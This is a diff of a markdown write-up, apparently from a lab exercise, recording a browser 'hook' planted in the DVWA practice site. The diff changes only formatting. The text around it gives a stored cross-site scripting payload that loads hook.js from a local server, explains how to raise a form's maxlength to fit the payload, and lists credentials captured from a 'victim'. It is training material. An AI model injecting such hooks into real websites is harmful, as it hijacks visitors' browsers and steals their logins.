@@ -2,7 +2,7 @@
 
 ### 1. Successfully "hooked" URL 192.168.13.25 on port 80 / Firefox
 
-    ![pic](hook-1.PNG)  
+![pic](hook-1.PNG)  
 
 **NOTE: the payload required to "hook" the DVWA website requires injecting a script. However the script (script src="http://127.0.0.1:3000/hook.js"></script) has to many words to be fully pasted into the message. In-order to fix this limitation, you must change setting in the Inspect Element. Specifically the textarea name / maxlength from 50 to 75.**
 
@@ -15,7 +15,7 @@
 ![pic](hook-3.PNG) 
 
 
-* Victim entered the following:
+* Victim entered the following: 
 
     A) Email: Rob1@fake.com
 
